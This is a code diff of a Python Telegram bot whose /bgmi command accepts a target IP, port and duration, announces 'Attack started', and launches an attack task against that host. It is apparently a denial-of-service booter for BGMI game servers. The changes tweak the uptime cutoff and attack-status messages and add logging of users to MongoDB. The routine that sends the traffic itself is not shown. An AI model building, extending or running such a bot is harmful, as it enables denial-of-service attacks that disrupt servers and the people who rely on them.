@@ -58,12 +58,13 @@ async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     # Respond with the uptime
     await update.message.reply_text(f"⏳ Bot uptime: {minutes} minutes and {seconds} seconds.")
 
+# BGMI command handler
 async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     global active_attack
 
     # Check if bot uptime exceeds 15 minutes
     uptime = time.time() - bot_start_time
-    if uptime > 1020:  # 15 minutes in seconds
+    if uptime > 900:  # 15 minutes in seconds
         await update.message.reply_text("⏳ Wait for 5 minutes. The bot is going to restart.")
         return
 
@@ -72,23 +73,18 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     # Check if an attack is already in progress
     if active_attack or user_processes:
-        # Retrieve details of the current attack
-        ongoing_attacks = [
-            f"Host: {data['target_ip']}, Port: {data['port']}, Time: {data['duration']} seconds"
-            for data in user_processes.values()
-        ]
-        attack_details = "\n".join(ongoing_attacks) if ongoing_attacks else "Attack in progress."
-        await update.message.reply_text(
-            f"🚫 An attack is already in progress. Please wait for it to finish.\n\nOngoing Attack:\n{attack_details}"
-        )
+        await update.message.reply_text("🚫 An attack is already in progress. Please wait for it to finish.")
         return
 
-    # Check if arguments are provided
+    # Save user info to MongoDB
+    user = update.message.from_user
+    await save_user_info(user.id, user.username or "Unknown")
+
+    # Parse arguments
     if len(context.args) != 3:
         await update.message.reply_text("🛡️ Use /bgmi <IP> <Port> <Time> to start an attack.")
         return
 
-    # Parse arguments
     target_ip = context.args[0]
     try:
         port = int(context.args[1])
@@ -102,13 +98,15 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         duration = MAX_DURATION
         await update.message.reply_text(f"⚠️ Max attack duration is {MAX_DURATION} seconds.")
 
-    # Notify user about the attack start
     active_attack = True
+
+    # Notify user about the attack start
     attack_message = await update.message.reply_text(
         f"🚀 Attack started on \nHost: {target_ip}\nPort: {port}\nTime: {duration} seconds."
     )
 
     asyncio.create_task(start_attack(target_ip, port, duration, update.message.from_user.id, attack_message, context))
+
 
 async def start_attack(target_ip, port, duration, user_id, original_message, context):
     global active_attack
@@ -143,7 +141,7 @@ async def start_attack(target_ip, port, duration, user_id, original_message, con
             del user_processes[user_id]
         await context.bot.send_message(
             chat_id=GROUP_ID,
-            text=f"⚠️ Attack terminated due to duration limit on {target_ip}:{port}."
+            text=f"🛑 Attack finished on \nHost: {target_ip}\nPort: {port}\nTime: {duration} seconds."
         )
 
     except Exception as e:
